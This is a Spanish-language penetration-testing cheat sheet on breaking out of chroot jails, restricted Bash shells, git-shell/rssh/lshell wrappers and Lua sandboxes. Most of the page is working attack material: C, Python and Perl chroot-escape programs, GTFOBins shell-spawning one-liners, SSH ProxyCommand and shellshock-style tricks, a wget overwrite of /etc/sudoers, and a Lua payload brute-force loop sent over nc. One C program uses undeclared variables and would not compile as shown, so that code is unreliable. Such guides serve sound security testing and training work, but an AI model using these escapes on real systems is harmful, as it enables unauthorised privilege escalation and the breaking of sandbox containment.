# Escaping de Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Busca en** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **si puedes ejecutar cualquier binary con la propiedad "Shell"**

## Escapes de Chroot

De [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): El mecanismo chroot **no está diseñado para defenderse** contra la manipulación intencionada por parte de **usuarios privilegiados** (**root**). En la mayoría de los sistemas, los contextos chroot no se anidan correctamente y los programas dentro de un chroot **con suficientes privilegios pueden realizar un segundo chroot para escapar**.\
Normalmente, esto significa que para escapar necesitas ser root dentro del chroot.<sup>[[4]](#references)</sup>

> [!TIP]
> La **herramienta** [**chw00t**](https://github.com/earthquake/chw00t) fue creada para abusar de los siguientes escenarios y escapar de `chroot`.<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> Si eres **root** dentro de un chroot, **puedes escapar** creando **otro chroot**. Esto se debe a que 2 chroots no pueden coexistir (en Linux), así que si creas una carpeta y después **creas un nuevo chroot** en esa nueva carpeta siendo **tú quien está fuera de ella**, ahora estarás **fuera del nuevo chroot** y, por tanto, estarás en el FS.
>
> Esto ocurre porque normalmente chroot NO mueve tu directorio de trabajo al indicado, por lo que puedes crear un chroot pero estar fuera de él.<sup>[[4]](#references)[[5]](#references)</sup>

Normalmente no encontrarás el binary `chroot` dentro de un chroot jail, pero **podrías compilar, subir y ejecutar** un binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + FD guardado

> [!WARNING]
> Esto es similar al caso anterior, pero en este caso el **atacante guarda un descriptor de archivo del directorio actual** y luego **crea el chroot en una carpeta nueva**. Finalmente, como tiene **acceso** a ese **FD** **fuera** del chroot, accede a él y **escapa**.<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> Los FD se pueden pasar mediante Unix Domain Sockets, por lo que:
>
> - Crear un proceso hijo (fork)
> - Crear un UDS para que el proceso padre y el hijo puedan comunicarse
> - Ejecutar chroot en el proceso hijo, en una carpeta diferente
> - En el proceso padre, crear un FD de una carpeta que esté fuera del chroot del nuevo proceso hijo
> - Pasar ese FD al proceso hijo usando el UDS
> - El proceso hijo hace chdir a ese FD y, como está fuera de su chroot, escapará del jail.<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - Montar el dispositivo root (/) en una carpeta dentro del chroot
> - Hacer chroot en esa carpeta
>
> Esto es posible en Linux.<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - Montar procfs en una carpeta dentro del chroot (si aún no está montado)
> - Buscar un pid que tenga una entrada root/cwd diferente, como: /proc/1/root
> - Hacer chroot en esa entrada.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Crear un Fork (proceso hijo), hacer chroot en una carpeta diferente y más profunda del FS, y hacer CD en ella
> - Desde el proceso padre, mover la carpeta en la que se encuentra el proceso hijo a una carpeta anterior al chroot del proceso hijo
> - Este proceso hijo se encontrará fuera del chroot.<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - Que un proceso pueda conectarse con `ptrace` depende de las credenciales, las capabilities y los módulos de seguridad habilitados, como Yama; por tanto, la depuración con el mismo usuario puede estar restringida por la política del sistema.<sup>[[8]](#references)</sup>
> - Si se permite la conexión, podrías hacer ptrace sobre un proceso y ejecutar un shellcode dentro de él ([see this example](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Enumeración

Obtener información sobre el jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Modificar PATH

Comprueba si puedes modificar la variable de entorno PATH.<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Usando vim

Si Vim está disponible, establece su opción `shell` en un shell que puedas ejecutar e invoca `:shell`.<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### Paginadores y visores de ayuda

Muchos entornos restringidos todavía dejan disponibles **paginadores** o **visores de ayuda**. Normalmente, es más rápido abusar de ellos que intentar reconstruir `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Si `git` está disponible, su opción `--paginate` envía la salida a `less` o `$PAGER`, lo que resulta útil cuando hay un escape del pager disponible.<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### One-liners comunes de GTFOBins

Una vez que sepas a qué binarios se puede acceder, prueba primero los shell spawners más obvios:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Si solo puedes **inyectar argumentos** en un comando permitido (en lugar de ejecutarlo libremente), consulta también **GTFOArgs**.<sup>[[17]](#references)</sup>

### Crear script

Comprueba si puedes crear un archivo ejecutable con _/bin/bash_ como contenido
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obtener bash desde SSH

Si accedes mediante ssh, a menudo puedes pedirle al servidor que ejecute un **programa diferente** en lugar del shell de inicio de sesión restringido.<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Si `ssh` es uno de los pocos binarios permitidos localmente, recuerda que también puede abusarse de él como **GTFOBin**; sus opciones `LocalCommand` y `ProxyCommand` ejecutan comandos auxiliares configurados localmente.<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declarar

En Bash, una nameref redirige las asignaciones a otra variable, mientras que añadir un elemento a `BASH_CMDS` agrega ese comando a la tabla hash interna de comandos de Bash.<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

La opción `-O` de Wget escribe el contenido descargado en el archivo de salida especificado; si esa ruta permite escritura, esto puede sobrescribir un archivo como `/etc/sudoers`.<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Wrappers de shell restringidos (`git-shell`, `rssh`, `lshell`)

Algunos entornos no te dejan en un `rbash` simple, sino en **wrappers** como `git-shell`, `rssh` o `lshell`:

- `git-shell` solo acepta comandos de Git del lado del servidor, además de cualquier elemento presente dentro de `~/git-shell-commands/`. Si ese directorio existe, ejecuta `help` para enumerar las acciones personalizadas permitidas. Si puedes **escribir** allí, cualquier ejecutable que coloques en ese directorio estará disponible.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` suelen permitir únicamente operaciones de estilo `scp`, `sftp`, `rsync` o Git. En esos casos, céntrate primero en las **primitivas de escritura de archivos**: sube `authorized_keys`, un archivo de inicio del shell o un script auxiliar a una ubicación escribible y vuelve a conectarte con `ssh -t ...`.
- Si el wrapper solo filtra la línea de comandos, enumera los binarios accesibles y luego recurre a **GTFOBins / GTFOArgs**.

### Otros trucos

Comprueba también:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**La página siguiente también podría ser interesante:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Jails de Python

Trucos para escapar de Python jails en la siguiente página:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Jails de Lua

En esta página puedes encontrar las funciones globales a las que tienes acceso dentro de Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>

Las funciones estándar `load`, `string.char` y `os.execute` pueden construir y ejecutar este bloque cuando están disponibles.<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Una función de tabla también puede obtenerse con `rawget` en lugar de la sintaxis de punto.<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Usa `pairs` para enumerar una tabla de biblioteca.<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
El orden en el que `pairs` enumera los índices de la tabla no está especificado, por lo que no debes depender de que una función concreta aparezca primero. Si necesitas ejecutar una función específica, puedes realizar un ataque de fuerza bruta cargando distintos entornos de lua y llamando a la primera función de la library.<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obtener un shell interactivo de lua**: Si estás dentro de un shell de lua limitado, puedes obtener un nuevo shell de lua (y, con suerte, ilimitado) llamando a `debug.debug()`, lo que inicia un modo interactivo.<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t: Cómo escapar de varias soluciones chroot (Bucsay Balazs, charla y diapositivas de DeepSec)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [Manual de referencia de GNU Bash – El shell restringido](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Documentación de Git](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – página del manual de Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – herramienta de escape de chroot](https://github.com/earthquake/chw00t)
- [6] [unix(7) – página del manual de Linux](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – página del manual de Linux](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – página del manual de Linux](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Documentación de Git](https://git-scm.com/docs/git)
- [10] [:shell – documentación de Vim](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Builtins de Bash – Manual de referencia de GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Variables de Bash – Manual de referencia de GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [Manual de GNU Wget](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – página del manual de OpenBSD](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – página del manual de OpenBSD](https://man.openbsd.org/ssh_config)
- [16] [Manual de referencia de Lua 5.4](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: lista de vectores de explotación de inyección de argumentos](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
